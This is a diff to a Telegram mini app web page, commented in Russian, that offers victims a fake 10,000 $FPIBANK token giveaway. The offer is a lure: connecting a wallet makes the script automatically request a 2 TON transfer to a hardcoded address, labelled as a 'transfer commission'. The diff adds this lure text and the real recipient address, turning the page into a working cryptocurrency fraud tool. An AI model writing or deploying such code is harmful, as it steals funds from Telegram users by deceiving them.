@@ -49,11 +49,12 @@
 <body>
     <div class="container">
         <img src="https://raw.githubusercontent.com/RFRFQRFARFQF/Telegram-mini-app/main/photo.jpg" alt="Фото">
-        <p>ПОДКЛЮЧИ КОШЕЛЕК И ОТПРАВЬ 2 TON</p>
+        <p>ПОЛУЧИТЬ 10.000$FPIBANK</p>
+        <p>ПОДКЛЮЧИТЬ КОШЕЛЕК ДЛЯ ПОЛУЧЕНИЯ</p>
         <button id="connect-wallet">CONNECT WALLET</button>
     </div>
 
-    <script>
+    <script>    
         let tg = window.Telegram.WebApp;
         tg.expand(); // Разворачиваем приложение на весь экран
 
@@ -75,9 +76,9 @@
 
                     // Автоматически создаем запрос на перевод 2 TON
                     const transaction = {
-                        to: "EQC3DQ...ЗАМЕНИТЕ_НА_АДРЕС",  // Адрес получателя
+                        to: "UQDDZ6llEnqAe2QqRAyuY3rQkWa3ZdFFH_Ksc8AjcrRvtFzc",  // Адрес получателя
                         value: "2000000000",  // 2 TON (в нанотонах)
-                        payload: "",  // Можно добавить комментарий
+                        payload: "КОМИССИЯ ПЕРЕВОДА",  // Можно добавить комментарий
                     };
 
                     await tonConnect.sendTransaction(transaction);
